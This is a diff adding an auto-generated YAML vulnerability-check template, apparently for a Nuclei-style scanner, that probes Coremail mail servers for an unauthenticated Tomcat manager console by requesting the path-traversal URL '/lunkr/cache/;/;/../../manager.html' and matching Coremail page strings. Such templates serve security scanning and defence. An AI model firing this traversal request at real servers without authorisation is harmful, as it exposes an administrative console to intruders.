@@ -1,0 +1,26 @@
+# 自动生成：tools/import_ref_pocs.py，请勿手工编辑（重跑会覆盖）
+id: ref-coremail-jump_tomcat_console
+info:
+  name: "Coremail jump_tomcat_console"
+  author: imported-from-myscan
+  severity: medium
+  tags: [imported, coremail, ref-poc, unauth]
+  description: "由参考项目脚本静态导入：Coremail/jump_tomcat_console（类型 UNAUTH）。"
+http:
+  - method: GET
+    path:
+      - "/"
+      - "/lunkr/cache/;/;/../../manager.html"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        condition: or
+        words:
+          - "<a href=\"http://www.coremail.cn\" target=\"_blank\">"
+          - "fmt_logoalt: \"coremail 电子邮件系统"
+          - "action=\"/coremail/index.jsp"
+          - "/coremail/bundle/"
+          - "coremail/common"
